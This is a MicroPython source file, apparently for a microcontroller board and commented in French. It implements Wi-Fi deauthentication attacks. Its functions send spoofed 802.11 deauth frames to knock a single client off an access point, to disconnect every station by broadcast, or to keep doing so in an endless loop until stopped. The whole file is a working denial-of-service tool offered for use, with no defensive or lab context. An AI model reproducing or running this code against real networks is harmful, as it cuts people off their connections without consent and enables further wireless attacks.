import network
import utime
from lib.packet_builder import build_deauth, send
from lib.display import info, ok, warn, line

BROADCAST = "ff:ff:ff:ff:ff:ff"


def _wifi_init(channel=6):
    """Initialise l'interface STA sur le bon canal avant d'injecter."""
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.config(channel=channel)
    utime.sleep_ms(100)


def deauth_client(ap_mac, client_mac, count=100, interval_ms=100, channel=6):
    """
    Envoie `count` paires de trames deauth pour expulser `client_mac` de `ap_mac`.
    Envoie dans les deux sens (AP→client et client→AP) pour maximiser l'effet.
    """
    _wifi_init(channel)
    info("Deauth : {} ↔ {} ({} trames)".format(client_mac, ap_mac, count))
    sent = 0
    try:
        for _ in range(count):
            if send(build_deauth(ap_mac,    client_mac, ap_mac)):
                sent += 1
            if send(build_deauth(client_mac, ap_mac,    ap_mac)):
                sent += 1
            utime.sleep_ms(interval_ms)
    except KeyboardInterrupt:
        warn("Deauth interrompu")

    line()
    ok("{} trames envoyées".format(sent))
    return sent


def deauth_broadcast(ap_mac, count=100, interval_ms=100, channel=6):
    """Deauth broadcast — cible toutes les stations associées à `ap_mac`."""
    _wifi_init(channel)
    info("Deauth broadcast — AP : {}".format(ap_mac))
    sent = 0
    try:
        for _ in range(count):
            if send(build_deauth(ap_mac, BROADCAST, ap_mac)):
                sent += 1
            utime.sleep_ms(interval_ms)
    except KeyboardInterrupt:
        warn("Deauth interrompu")

    line()
    ok("{} trames envoyées".format(sent))
    return sent


def deauth_loop(ap_mac, client_mac=None, interval_ms=100, channel=6):
    """Deauth continu jusqu'à Ctrl+C. client_mac=None → broadcast."""
    _wifi_init(channel)
    target = client_mac or BROADCAST
    info("Deauth continu — AP:{} CIBLE:{} — Ctrl+C pour stopper".format(ap_mac, target))
    total = 0
    try:
        while True:
            send(build_deauth(ap_mac, target, ap_mac))
            if client_mac:
                send(build_deauth(client_mac, ap_mac, ap_mac))
            total += 1
            utime.sleep_ms(interval_ms)
    except KeyboardInterrupt:
        pass

    line()
    ok("{} trames envoyées".format(total))
    return total
